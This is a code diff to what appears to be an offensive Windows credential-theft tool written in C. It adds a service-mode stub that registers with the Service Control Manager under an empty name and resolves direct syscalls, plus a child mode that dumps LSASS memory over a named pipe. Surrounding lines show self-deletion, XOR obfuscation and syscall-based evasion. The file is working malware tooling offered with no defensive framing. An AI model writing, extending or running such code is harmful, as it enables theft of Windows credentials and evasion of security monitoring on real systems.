@@ -103,14 +103,111 @@ static void self_delete(void) {
     sys_NtClose(hFile);
 }
 
+/* ── Service stub (mode 16) ──────────────────────────────── */
+
+typedef BOOL (WINAPI *PFN_StartDispatcher)(PVOID);
+typedef HANDLE (WINAPI *PFN_RegHandler)(LPCWSTR, PVOID);
+typedef BOOL (WINAPI *PFN_SetSvcStatus)(HANDLE, PVOID);
+
+typedef struct _SVC_STATUS {
+    DWORD dwServiceType;
+    DWORD dwCurrentState;
+    DWORD dwControlsAccepted;
+    DWORD dwWin32ExitCode;
+    DWORD dwServiceSpecificExitCode;
+    DWORD dwCheckPoint;
+    DWORD dwWaitHint;
+} SVC_STATUS;
+
+static void WINAPI svc_ctrl_handler(DWORD ctrl) {
+    (void)ctrl;
+}
+
+static void WINAPI svc_main(DWORD argc, LPWSTR *argv) {
+    (void)argc; (void)argv;
+
+    PFN_RegHandler reg = (PFN_RegHandler)g_addr.pfnRegHandler;
+    PFN_SetSvcStatus set = (PFN_SetSvcStatus)g_addr.pfnSetStatus;
+
+    wchar_t name[] = L"";
+    HANDLE h = reg(name, svc_ctrl_handler);
+    if (!h) return;
+
+    /* Tell SCM we need time (avoids 30s connection timeout) */
+    SVC_STATUS ss;
+    ss.dwServiceType = 0x10;
+    ss.dwCurrentState = 2;      /* SERVICE_START_PENDING */
+    ss.dwControlsAccepted = 0;
+    ss.dwWin32ExitCode = 0;
+    ss.dwServiceSpecificExitCode = 0;
+    ss.dwCheckPoint = 1;
+    ss.dwWaitHint = 30000;
+    set(h, &ss);
+
+    /* Resolve syscalls inside START_PENDING (needs NtCreateFile etc.) */
+    if (!resolve_syscalls()) {
+        ss.dwCurrentState = 1;  /* SERVICE_STOPPED */
+        ss.dwWin32ExitCode = 1;
+        ss.dwCheckPoint = 0;
+        ss.dwWaitHint = 0;
+        set(h, &ss);
+        return;
+    }
+
+    ss.dwCurrentState = 4;      /* SERVICE_RUNNING */
+    ss.dwCheckPoint = 0;
+    ss.dwWaitHint = 0;
+    set(h, &ss);
+
+    /* Write marker file to confirm SERVICE_RUNNING was reached */
+    wchar_t marker_path[] = L"\\??\\C:\\Windows\\Temp\\_svcrun.tmp";
+    UNICODE_STRING us_m;
+    us_m.Buffer = marker_path;
+    us_m.Length = 62;
+    us_m.MaximumLength = 64;
+    OBJECT_ATTRIBUTES oa_m;
+    InitializeObjectAttributes(&oa_m, &us_m, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    IO_STATUS_BLOCK iosb_m;
+    HANDLE hf = NULL;
+    sys_NtCreateFile(&hf, 0x40110000, &oa_m, &iosb_m, NULL,
+        0x80, 0, FILE_OVERWRITE_IF,
+        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+        NULL, 0);
+    if (hf) sys_NtClose(hf);
+
+    /* Brief delay so SCM records RUNNING */
+    LARGE_INTEGER delay;
+    delay.QuadPart = -5000000LL; /* 500ms */
+    sys_NtDelayExecution(FALSE, &delay);
+
+    sys_NtTerminateProcess((HANDLE)-1, 1);
+}
+
+static void run_as_service(void) {
+    PFN_StartDispatcher start =
+        (PFN_StartDispatcher)g_addr.pfnStartDispatcher;
+
+    wchar_t name[] = L"";
+    struct {
+        LPWSTR lpName;
+        PVOID  lpProc;
+        LPWSTR lpName2;
+        PVOID  lpProc2;
+    } table;
+    table.lpName = name;
+    table.lpProc = svc_main;
+    table.lpName2 = NULL;
+    table.lpProc2 = NULL;
+
+    start(&table);
+}
+
 /* ── Entry point ─────────────────────────────────────────── */
 
 void main_entry(void) {
     PUNICODE_STRING cmdline_us = get_command_line();
-    if (!cmdline_us || !cmdline_us->Buffer) {
-        sys_NtTerminateProcess((HANDLE)-1, 1);
+    if (!cmdline_us || !cmdline_us->Buffer)
         return;
-    }
 
     wchar_t *p = cmdline_us->Buffer;
 
@@ -140,13 +237,27 @@ void main_entry(void) {
     while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
     *end = L'\0';
 
-    if (mode == 0 || out_name[0] == L'\0') {
-        sys_NtTerminateProcess((HANDLE)-1, 1);
+    if (mode == 0 || out_name[0] == L'\0')
+        return;
+
+    /* Service stub: connect to SCM ASAP, resolve SSNs inside START_PENDING */
+    if (mode == 16) {
+        if (!resolve_service_funcs())
+            return;
+        run_as_service();
         return;
     }
 
-    if (!resolve_syscalls()) {
-        sys_NtTerminateProcess((HANDLE)-1, 2);
+    if (!resolve_syscalls())
+        return;
+
+    /* Child mode: raw LSASS dump, no XOR, no PYD header */
+    if (mode & 8) {
+        HANDLE pipe = open_named_pipe(out_name);
+        if (!pipe) { sys_NtTerminateProcess((HANDLE)-1, 3); return; }
+        BOOL success = dump_lsass(pid, pipe);
+        close_pipe(pipe);
+        sys_NtTerminateProcess((HANDLE)-1, success ? 0 : 4);
         return;
     }
 
@@ -175,7 +286,7 @@ void main_entry(void) {
         write_pipe(pipe, &zero, 4); /* security_len = 0 */
     }
 
-    /* LSASS minidump */
+    /* LSASS minidump — direct dump (process must be local) */
     BOOL success = TRUE;
     if (mode & 2) {
         success = dump_lsass(pid, pipe);
